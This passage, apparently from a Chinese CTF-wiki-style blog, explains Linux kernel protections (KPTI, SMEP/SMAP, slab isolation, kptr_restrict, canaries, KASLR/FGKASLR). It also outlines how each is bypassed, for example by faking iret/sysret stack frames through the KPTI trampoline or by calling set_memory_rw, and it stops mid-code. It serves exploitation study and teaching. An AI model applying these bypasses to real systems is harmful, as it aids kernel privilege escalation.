<code>native_write_cr4</code>，当我们能够劫持控制流后，我们就可以执行内核中对应的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。</p><p><strong>copy_from/to_user</strong></p><p>在劫持控制流后，攻击者可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志。</p><h4 id="KPTI-Kernel-Page-Table-Isolation"><a href="#KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="KPTI - Kernel Page Table Isolation"></a>KPTI - Kernel Page Table Isolation</h4><p>KPTI 机制最初的主要目的是为了缓解 KASLR 的绕过以及 CPU 侧信道攻击。</p><p>在 KPTI 机制中，内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。</p><ul><li>内核态中的页表包括用户空间内存的页表和内核空间内存的页表。</li><li>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。</li></ul><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p><p>在 x86_64 的 PTI 机制中，内核态的用户空间内存映射部分被全部标记为不可执行。也就是说，<u>之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性</u>。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，<u>在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存</u>，只是不能跳转到用户态空间执行 Shellcode。</p><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110。</p><p>如果是使用 qemu 启动的内核，可以在 <code>-append</code> 选项中添加 <code>kpti=1</code> 来开启 KPTI。</p><p>如果是使用 qemu 启动的内核，可以在 <code>-append</code> 选项中添加 <code>nopti</code> 来关闭 KPTI。</p><p>可以通过以下两种方式来查看 KPTI 机制是否开启。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn # dmesg | grep &#x27;page table&#x27;</span><br><span class="line">[    0.000000] Kernel/User page tables isolation: enabled</span><br><span class="line">/home/pwn # cat /proc/cpuinfo | grep pti</span><br><span class="line">fpu_exception   : yes</span><br><span class="line">flags           : ... pti smep smap</span><br></pre></td></tr></table></figure><h5 id="Attack-KPTI"><a href="#Attack-KPTI" class="headerlink" title="Attack KPTI"></a>Attack KPTI</h5><p>KPTI 机制和 SMAP 、SMEP 不太一样，<strong>由于与源码紧密结合，似乎没有办法在运行时刻关闭</strong>。</p><h6 id="修改页表"><a href="#修改页表" class="headerlink" title="修改页表"></a>修改页表</h6><p>在开启 KPTI 后，用户态空间的所有数据都被标记了 NX 权限，但是，可以考虑修改对应的页表权限，使其拥有可执行权限。当内核没有开启 smep 权限时，我们在修改了页表权限后就可以返回到用户态，并执行用户态的代码。</p><h6 id="SWITCH-TO-USER-CR3-STACKtack"><a href="#SWITCH-TO-USER-CR3-STACKtack" class="headerlink" title="SWITCH_TO_USER_CR3_STACKtack)"></a>SWITCH_TO_USER_CR3_STACKtack)</h6><p>在开启 KPTI 机制后，用户态进入到内核态时，会进行页表切换；当从内核态恢复到用户态时，也会进行页表切换。那么如果我们可以控制内核执行返回用户态时所执行的切换页表的代码片段，也就可以正常地返回到用户态。</p><p>通过分析内核态到用户态切换的代码，我们可以得知，页表的切换主要靠<code>SWITCH_TO_USER_CR3_STACK</code> 汇编宏。因此，我们只需要能够调用这部分代码即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.macro SWITCH_TO_USER_CR3_STACK scratch_reg:req</span><br><span class="line">    pushq   %rax</span><br><span class="line">    SWITCH_TO_USER_CR3_NOSTACK scratch_reg=\scratch_reg scratch_reg2=%rax</span><br><span class="line">    popq    %rax</span><br><span class="line">.endm</span><br><span class="line">.macro SWITCH_TO_USER_CR3_NOSTACK scratch_reg:req scratch_reg2:req</span><br><span class="line">    ALTERNATIVE <span class="string">&quot;jmp .Lend_\@&quot;</span>, <span class="string">&quot;&quot;</span>, X86_FEATURE_PTI</span><br><span class="line">    mov %cr3, \scratch_reg</span><br><span class="line"></span><br><span class="line">    ALTERNATIVE <span class="string">&quot;jmp .Lwrcr3_\@&quot;</span>, <span class="string">&quot;&quot;</span>, X86_FEATURE_PCID</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Test if the ASID needs a flush.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    movq    \scratch_reg, \scratch_reg2</span><br><span class="line">    andq    $(<span class="number">0x7FF</span>), \scratch_reg      <span class="comment">/* mask ASID */</span></span><br><span class="line">    bt  \scratch_reg, THIS_CPU_user_pcid_flush_mask</span><br><span class="line">    jnc .Lnoflush_\@</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flush needed, clear the bit */</span></span><br><span class="line">    btr \scratch_reg, THIS_CPU_user_pcid_flush_mask</span><br><span class="line">    movq    \scratch_reg2, \scratch_reg</span><br><span class="line">    jmp .Lwrcr3_pcid_\@</span><br><span class="line"></span><br><span class="line">.Lnoflush_\@:</span><br><span class="line">    movq    \scratch_reg2, \scratch_reg</span><br><span class="line">    SET_NOFLUSH_BIT \scratch_reg</span><br><span class="line"></span><br><span class="line">.Lwrcr3_pcid_\@:</span><br><span class="line">    <span class="comment">/* Flip the ASID to the user version */</span></span><br><span class="line">    orq $(PTI_USER_PCID_MASK), \scratch_reg</span><br><span class="line"></span><br><span class="line">.Lwrcr3_\@:</span><br><span class="line">    <span class="comment">/* Flip the PGD to the user version */</span></span><br><span class="line">    orq     $(PTI_USER_PGTABLE_MASK), \scratch_reg</span><br><span class="line">    mov \scratch_reg, %cr3</span><br><span class="line">.Lend_\@:</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure><p>事实上，我们不仅希望切换页表，还希望能够返回到用户态，因此我们这里也需要复用内核中返回至用户态的代码。内核返回到用户态主要有两种方式：iret 和 sysret。下面详细介绍。</p><p><strong>iret</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line">#ifdef CONFIG_DEBUG_ENTRY</span><br><span class="line">    /* Assert that pt_regs indicates user mode. */</span><br><span class="line">    testb   $3, CS(%rsp)</span><br><span class="line">    jnz 1f</span><br><span class="line">    ud2</span><br><span class="line">1:</span><br><span class="line">#endif</span><br><span class="line">    POP_REGS pop_rdi=0</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span><br><span class="line">     * Save old stack pointer and switch to trampoline stack.</span><br><span class="line">     */</span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">    UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">    /* Copy the IRET frame to the trampoline stack. */</span><br><span class="line">    pushq   6*8(%rdi)   /* SS */</span><br><span class="line">    pushq   5*8(%rdi)   /* RSP */</span><br><span class="line">    pushq   4*8(%rdi)   /* EFLAGS */</span><br><span class="line">    pushq   3*8(%rdi)   /* CS */</span><br><span class="line">    pushq   2*8(%rdi)   /* RIP */</span><br><span class="line"></span><br><span class="line">    /* Push user RDI on the trampoline stack. */</span><br><span class="line">    pushq   (%rdi)</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * We are on the trampoline stack.  All regs except RDI are live.</span><br><span class="line">     * We can do future final exit work right here.</span><br><span class="line">     */</span><br><span class="line">    STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">    /* Restore RDI. */</span><br><span class="line">    popq    %rdi</span><br><span class="line">    SWAPGS</span><br><span class="line">    INTERRUPT_RETURN</span><br></pre></td></tr></table></figure><p>可以看到，通过伪造如下的栈，然后跳转到 <code>movq %rsp, %rdi</code>，我们就可以同时切换页表和返回至用户态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake rax</span><br><span class="line">fake rdi</span><br><span class="line">RIP</span><br><span class="line">CS</span><br><span class="line">EFLAGS</span><br><span class="line">RSP</span><br><span class="line">SS</span><br></pre></td></tr></table></figure><p><strong>sysret</strong></p><p>在使用 sysret 时，我们首先需要确保 rcx 和 r11 为如下的取值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rcx, save the rip of the code to be executed when returning to userspace</span><br><span class="line">r11, save eflags</span><br></pre></td></tr></table></figure><p>然后构造如下的栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake rdi</span><br><span class="line">rsp, the stack of the userspace</span><br></pre></td></tr></table></figure><p>最后跳转至 entry_SYSCALL_64 的如下代码，即可返回到用户态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">popq    %rdi</span><br><span class="line">popq    %rsp</span><br><span class="line">swapgs</span><br><span class="line">sysretq</span><br></pre></td></tr></table></figure><h6 id="signal-handler"><a href="#signal-handler" class="headerlink" title="signal handler"></a>signal handler</h6><p>我们也可以考虑在用户态注册 signal handler 来执行位于用户态的代码。在这种方式下，我们无需切换页表。</p><h3 id="Inside-Kernel"><a href="#Inside-Kernel" class="headerlink" title="Inside Kernel"></a>Inside Kernel</h3><h4 id="堆块隔离"><a href="#堆块隔离" class="headerlink" title="堆块隔离"></a>堆块隔离</h4><h5 id="GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离"><a href="#GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离" class="headerlink" title="GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离"></a>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离</h5><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code>。</p><p>在 5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792">这个 commit</a> 中取消了隔离机制，自内核版本 5.14 起，在 <a href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552">这个 commit</a> 当中又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离。</li></ul><h5 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h5><p>根据描述，如果在使用 <code>kmem_cache_create</code> 创建一个 cache 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Currently, if we want to account all objects of a particular kmem cache,</span><br><span class="line">we have to pass __GFP_ACCOUNT to each kmem_cache_alloc call, which is</span><br><span class="line">inconvenient. This patch introduces SLAB_ACCOUNT flag which if passed to</span><br><span class="line">kmem_cache_create will force accounting for every allocation from this</span><br><span class="line">cache even if __GFP_ACCOUNT is not passed.</span><br><span class="line"></span><br><span class="line">This patch does not make any of the existing caches use this flag - it</span><br><span class="line">will be done later in the series.</span><br><span class="line"></span><br><span class="line">Note, a cache with SLAB_ACCOUNT cannot be merged with a cache w/o</span><br><span class="line">SLAB_ACCOUNT, i.e. using this flag will probably reduce the number of</span><br><span class="line">merged slabs even if kmem accounting is not used (only compiled in).</span><br></pre></td></tr></table></figure><p>在早期，许多结构体（如 <strong>cred 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache。在 Linux 4.5 版本引入了这个 flag 后，许多结构体就单独使用了自己的 cache。然而，根据上面的描述，这一特性似乎最初并不是为了安全性引入的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Mark those kmem allocations that are known to be easily triggered from</span><br><span class="line">userspace as __GFP_ACCOUNT/SLAB_ACCOUNT, which makes them accounted to</span><br><span class="line">memcg.  For the list, see below:</span><br><span class="line"></span><br><span class="line"> - threadinfo</span><br><span class="line"> - task_struct</span><br><span class="line"> - task_delay_info</span><br><span class="line"> - pid</span><br><span class="line"> - cred</span><br><span class="line"> - mm_struct</span><br><span class="line"> - vm_area_struct and vm_region (nommu)</span><br><span class="line"> - anon_vma and anon_vma_chain</span><br><span class="line"> - signal_struct</span><br><span class="line"> - sighand_struct</span><br><span class="line"> - fs_struct</span><br><span class="line"> - files_struct</span><br><span class="line"> - fdtable and fdtable-&gt;full_fds_bits</span><br><span class="line"> - dentry and external_name</span><br><span class="line"> - inode for all filesystems. This is the most tedious part, because</span><br><span class="line">   most filesystems overwrite the alloc_inode method.</span><br><span class="line"></span><br><span class="line">The list is far from complete, so feel free to add more objects.</span><br><span class="line">Nevertheless, it should be close to &quot;account everything&quot; approach and</span><br><span class="line">keep most workloads within bounds.  Malevolent users will be able to</span><br><span class="line">breach the limit, but this was possible even with the former &quot;account</span><br><span class="line">everything&quot; approach (simply because it did not account everything in</span><br><span class="line">fact).</span><br></pre></td></tr></table></figure><h2 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h2><p>访问控制是指内核通过对某些对象添加访问控制，使得内核中相应的对象具有一定的访问控制要求，比如不可写，或者不可读。</p><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><h3 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h3><p>考虑到内核日志中可能会有一些地址信息或者敏感信息，研究者提出需要对内核日志的访问进行限制。</p><p>该选项用于控制是否可以使用 <code>dmesg</code> 来查看内核日志。当 <code>dmesg_restrict</code> 为 0 时，没有任何限制；当该选项为 1 时，只有具有 <code>CAP_SYSLOG</code> 权限的用户才可以通过 <code>dmesg</code> 命令来查看内核日志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dmesg_restrict:</span><br><span class="line"></span><br><span class="line">This toggle indicates whether unprivileged users are prevented</span><br><span class="line">from using dmesg(8) to view messages from the kernel&#x27;s log buffer.</span><br><span class="line">When dmesg_restrict is set to (0) there are no restrictions. When</span><br><span class="line">dmesg_restrict is set set to (1), users must have CAP_SYSLOG to use</span><br><span class="line">dmesg(8).</span><br><span class="line"></span><br><span class="line">The kernel config option CONFIG_SECURITY_DMESG_RESTRICT sets the</span><br><span class="line">default value of dmesg_restrict.</span><br></pre></td></tr></table></figure><h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><p>该选项用于控制在输出内核地址时施加的限制，主要限制以下接口</p><ul><li>通过 /proc 获取的内核地址</li><li>通过其它接口（有待研究）获取的地址</li></ul><p>具体输出的内容与该选项配置的值有关</p><ul><li>0：默认情况下，没有任何限制。</li><li>1：使用 <code>％pK</code> 输出的内核指针地址将被替换为 0，除非用户具有 CAP_ SYSLOG 特权，并且 group id 和真正的 id 相等。</li><li>2：使用 <code>％pK</code> 输出的内核指针都将被替换为 0 ，即与权限无关。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kptr_restrict:</span><br><span class="line"></span><br><span class="line">This toggle indicates whether restrictions are placed on</span><br><span class="line">exposing kernel addresses via /proc and other interfaces.</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to 0 (the default) the address is hashed before</span><br><span class="line">printing. (This is the equivalent to %p.)</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to (1), kernel pointers printed using the %pK</span><br><span class="line">format specifier will be replaced with 0&#x27;s unless the user has CAP_SYSLOG</span><br><span class="line">and effective user and group ids are equal to the real ids. This is</span><br><span class="line">because %pK checks are done at read() time rather than open() time, so</span><br><span class="line">if permissions are elevated between the open() and the read() (e.g via</span><br><span class="line">a setuid binary) then %pK will not leak kernel pointers to unprivileged</span><br><span class="line">users. Note, this is a temporary solution only. The correct long-term</span><br><span class="line">solution is to do the permission checks at open() time. Consider removing</span><br><span class="line">world read permissions from files that use %pK, and using dmesg_restrict</span><br><span class="line">to protect against uses of %pK in dmesg(8) if leaking kernel pointer</span><br><span class="line">values to unprivileged users is a concern.</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to (2), kernel pointers printed using</span><br><span class="line">%pK will be replaced with 0&#x27;s regardless of privileges.</span><br></pre></td></tr></table></figure><p>当开启该保护后，攻击者就不能通过 <code>/proc/kallsyms</code> 来获取内核中某些敏感的地址了，如 commit_creds、prepare_kernel_cred。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="__ro_after_init"></a>__ro_after_init</h4><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>Linux 内核中有很多数据都只会在 <code>__init</code> 阶段被初始化，而且之后不会被改变。使用 <code>__ro_after_init</code> 标记的内存，在 init 阶段结束后，不能够被再次修改。</p><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>我们可以使用 <code>set_memory_rw(unsigned long addr, int numpages)</code> 来修改对应页的权限。</p><h4 id="mmap-min-addr"><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h4><p>mmap_min_addr 是用来对抗 NULL Pointer Dereference 的，指定用户进程通过 mmap 可以使用的最低的虚拟内存地址。</p><h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>通过对内核中发生的异常行为进行检测，我们可以缓解一定的攻击。</p><h3 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h3><p>Canary 是一种典型的检测机制。在 Linux 内核中，Canary 的实现是与架构相关的，所以这里我们分别从不同的架构来介绍。</p><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><p>在 x86 架构中，同一个 task 中使用相同的 Canary。</p><p>在编译内核时，可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。</p><p>而如果要关闭,需要重新编译内核，并关闭编译选项才可以关闭 Canary 保护。</p><p>可以使用如下方式来检查是否开启了 Canary 保护</p><ol><li><code>checksec</code></li><li>人工分析二进制文件，看函数中是否有保存和检查 Canary 的代码</li></ol><p>可以发现，x86 架构下 Canary 实现的特点是同一个 task 共享 Canary。</p><p>根据 x86 架构下 Canary 实现的特点，我们只要泄漏了一次系统调用中的 Canary，同一 task 的其它系统调用中的 Canary 也就都被泄漏了。</p><h2 id="Randomization"><a href="#Randomization" class="headerlink" title="Randomization"></a>Randomization</h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>kaslr</code> 来开启 KASLR。</p><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nokaslr</code> 来关闭 KASLR。</p><p>通过泄漏内核某个段的地址，就可以得到这个段内的所有地址。比如当我们泄漏了内核的代码段地址，就知道内核代码段的所有地址。</p><h3 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h3><p>鉴于 KASLR 的不足，有研究者实现了 FGKASLR。FGKASLR 在 <u>KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。</u></p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>FGKASLR 的实现相对比较简单，主要在两个部分进行了修改。目前，FGKASLR <u>只支持 x86_64 架构</u>。</p><h5 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h5><p>FGKASLR 利用 gcc 的编译选项 <code>-ffunction-sections</code> <u>把内核中不同的函数放到不同的 section 中</u>。 在编译的过程中，<u>任何使用 C 语言编写的函数以及不在特殊输入节的函数都会单独作为一个节；使用汇编编写的代码会位于一个统一的节中。</u></p><p>编译后的 vmlinux 保留了所有的节区头（Section Headers），以便于知道每个函数的地址范围。同时，FGKASLR 还有一个重定位地址的扩展表。通过这两组信息，内核在解压缩后就可以乱序排列函数。</p><p>最后的 binary 的第一个段包含了一个合并节（由若干个函数合并而成）、以及若干其它单独构成一个节的函数。</p><h5 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h5><p>在解压内核后，会首先检查保留的符号信息，然后寻找需要随机化的 <code>.text.*</code> 节区。其中，第一个合并的节区 (<code>.text</code>) 会被跳过，不会被随机化。后面节区的地址会被随机化，但仍然会与 <code>.text</code> 节区相邻。同时，FGKASLR 修改了已有的用于更新重定位地址的代码，不仅考虑了相对于加载地址的偏移，还考虑了函数节区要被移动到的位置。</p><p>为了隐藏新的内存布局，/proc/kallsyms 中符号使用随机的顺序来排列。在 v4 版本之前，该文件中的符号按照字母序排列。</p><p>通过分析代码，我们可以知道，在 <code>layout_randomized_image</code> 函数中计算了最终会随机化的节区，存储在 sections 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * now we need to walk through the section headers and collect the</span></span><br><span class="line"><span class="comment"> * sizes of the .text sections to be randomized.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shnum; i++) &#123;</span><br><span class="line">    s = &amp;sechdrs[i];</span><br><span class="line">    sname = secstrings + s-&gt;sh_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;sh_type == SHT_SYMTAB) &#123;</span><br><span class="line">        <span class="comment">/* only one symtab per image */</span></span><br><span class="line">        <span class="keyword">if</span> (symtab)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        symtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">        <span class="keyword">if</span> (!symtab)</span><br><span class="line">            error(<span class="string">&quot;Failed to allocate space for symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(symtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">        num_syms = s-&gt;sh_size / <span class="keyword">sizeof</span>(*symtab);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;sh_type == SHT_STRTAB &amp;&amp; i != ehdr-&gt;e_shstrndx) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strtab)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate strtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        strtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">        <span class="keyword">if</span> (!strtab)</span><br><span class="line">            error(<span class="string">&quot;Failed to allocate space for strtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(strtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (text)</span><br><span class="line">            error(<span class="string">&quot;Unexpected duplicate .text section&quot;</span>);</span><br><span class="line"></span><br><span class="line">        text = s;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 